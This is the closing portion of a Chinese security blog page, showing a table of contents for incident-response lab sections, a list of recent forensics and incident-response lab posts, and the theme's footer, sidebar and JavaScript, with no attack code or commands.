class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%91%E6%BA%90OS"><span class="toc-number">7.</span> <span class="toc-text">近源OS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E5%A4%96%E7%BD%91IP%E5%9C%B0%E5%9D%80"><span class="toc-number">7.1.</span> <span class="toc-text">攻击者的外网IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E5%86%85%E7%BD%91%E8%B7%B3%E6%9D%BFIP%E5%9C%B0%E5%9D%80"><span class="toc-number">7.2.</span> <span class="toc-text">攻击者的内网跳板IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E4%BD%BF%E7%94%A8%E7%9A%84%E9%99%90%E9%80%9F%E8%BD%AF%E4%BB%B6%E7%9A%84md5%E5%A4%A7%E5%86%99"><span class="toc-number">7.3.</span> <span class="toc-text">攻击者使用的限速软件的md5大写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E5%90%8E%E9%97%A8md5%E5%A4%A7%E5%86%99"><span class="toc-number">7.4.</span> <span class="toc-text">攻击者的后门md5大写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%95%99%E4%B8%8B%E7%9A%84flag"><span class="toc-number">7.5.</span> <span class="toc-text">攻击者留下的flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6"><span class="toc-number">8.</span> <span class="toc-text">挖矿事件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E5%88%86%E8%A7%A3"><span class="toc-number">8.0.1.</span> <span class="toc-text">1. 命令分解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E5%8F%91%E7%8E%B0"><span class="toc-number">8.0.2.</span> <span class="toc-text">2. 关键发现</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-MHT%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" title="应急响应-MHT应急响应靶场"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/061-mht-20260420-150300.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应-MHT应急响应靶场"/></a><div class="content"><a class="title" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-MHT%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" title="应急响应-MHT应急响应靶场">应急响应-MHT应急响应靶场</a><time datetime="2026-04-20T06:54:06.000Z" title="发表于 2026-04-20 14:54:06">2026-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" title="应急响应-知攻善防应急响应靶场"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/060-zhigongshanfang-20260420-150300.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应-知攻善防应急响应靶场"/></a><div class="content"><a class="title" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" title="应急响应-知攻善防应急响应靶场">应急响应-知攻善防应急响应靶场</a><time datetime="2026-04-20T06:53:37.000Z" title="发表于 2026-04-20 14:53:37">2026-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%A0%B4%E9%98%B5%E9%98%81/" title="应急响应-破阵阁"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/059-pozhenge-20260420-150259.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应-破阵阁"/></a><div class="content"><a class="title" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%A0%B4%E9%98%B5%E9%98%81/" title="应急响应-破阵阁">应急响应-破阵阁</a><time datetime="2026-04-20T06:53:06.000Z" title="发表于 2026-04-20 14:53:06">2026-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%AC%AC%E4%B8%80%E5%B1%8Asolar/" title="应急响应-第一届solar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/058-solar-20260420-150258.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应-第一届solar"/></a><div class="content"><a class="title" href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%AC%AC%E4%B8%80%E5%B1%8Asolar/" title="应急响应-第一届solar">应急响应-第一届solar</a><time datetime="2026-04-20T06:51:40.000Z" title="发表于 2026-04-20 14:51:40">2026-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-MemLabs/" title="内存取证-MemLabs"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/057-memory-memlabs-20260420-150258.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内存取证-MemLabs"/></a><div class="content"><a class="title" href="/2026/04/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-MemLabs/" title="内存取证-MemLabs">内存取证-MemLabs</a><time datetime="2026-04-20T06:50:00.000Z" title="发表于 2026-04-20 14:50:00">2026-04-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><div id="runtimeTextTip"></div></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/" style="margin-inline:5px" data-title="本站已在豫备案" title="本站已在豫备案"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/hexo/icp.svg" alt="本站已在豫备案"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2026 By <a class="footer-bar-link" href="/" title="At4ckxu" target="_blank">At4ckxu</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/" title="豫ICP备2024089447号">豫ICP备2024089447号</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">8</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 0.88rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 0.88rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 0.88rem;">HTTP<sup>9</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>8</sup></a><a href="/tags/JavaScript/" style="font-size: 0.88rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>6</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 0.88rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 0.88rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">sql注入<sup>4</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" style="font-size: 0.88rem;">内存取证<sup>3</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 0.88rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 0.88rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>14</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("05/26/2025 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 At4ckxu 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
+  var grt = new Date("05/26/2025 00:00:00"); //设置网站上线时间
+  var now = new Date();
+  var dnum;
+  var hnum;
+  var mnum;
+  var snum;
+  var nowHour;
+
+  // 计算并更新天数、小时数、分钟数和秒数
+  function updateTime() {
+    now = new Date(); // 更新 now 的值
+    nowHour = now.getHours(); // 更新 nowHour 的值
+    var days = (now - grt) / 1000 / 60 / 60 / 24;
+    dnum = Math.floor(days);
+    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+      hnum = "0" + hnum;
+    }
+    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+      mnum = "0" + mnum;
+    }
+    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+      snum = "0" + snum;
+    }
+  }
+
+  // 更新网页中显示的网站运行时间
+  function updateHtml() {
+    const footer = document.getElementById("footer");
+    if (!footer) return
+    let currentTimeHtml = "";
+    if (nowHour < 18 && nowHour >= 9) {
+      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    } else {
+      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
+      let img = document.querySelector("#workboard .workSituationImg");
+      if (img != null) {
+        img.src = "";
+        img.title = "";
+        img.alt = "";
+      }
+
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    }
+
+    if (document.getElementById("runtimeTextTip")) {
+      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
+    }
+  }
+
+  setInterval(() => {
+    updateTime();
+    updateHtml();
+  }, 1000);
+})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
